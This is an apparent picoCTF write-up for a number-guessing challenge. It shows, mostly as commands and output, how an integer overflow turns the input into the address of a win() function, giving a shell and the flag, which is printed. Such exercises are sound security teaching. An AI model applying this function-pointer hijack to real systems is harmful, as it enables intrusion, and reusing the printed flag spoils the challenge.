@@ -1,0 +1,38 @@
+We need to exploit the line that runs
+
+    ((void (*)(void))val)();
+
+which will execute the function at memory address val. We can get the address of the
+win() function by disassembling it.
+
+$ objdump -d guess_num | grep win
+0804852b <win>:
+
+We know that we want val to end up being 0x0804852b, or 134513963.
+Since our input is being bitshifted to the right by 4, we can bitshift 134513963 to the left by 4
+and we get 2152223408. However, that results in an overflow. Luckily, we are also allowed to input negative
+numbers, so all we need to do is figure out what 2152223408 overflows to.
+$ python
+>>> 134513963 << 4
+2152223408
+>>> 2152223408 - (2**31-1)
+4739761
+>>> -(2**31) + 4739761
+-2142743887
+
+Finally, we have our number: -2142743887.
+
+$ nc shell2017.picoctf.com
+Welcome to the number guessing game!
+I'm thinking of a number. Can you guess it?
+Guess right and you get a shell!
+Enter your number: -2142743887
+You entered -2142743887. Let's see if it was right...
+Congratulations! Have a shell:
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+flag.txt
+guess_num
+xinetd_wrapper.sh
+$ cat flag.txt
+d1ec8d4078eac1112548c1a6a00cfe07
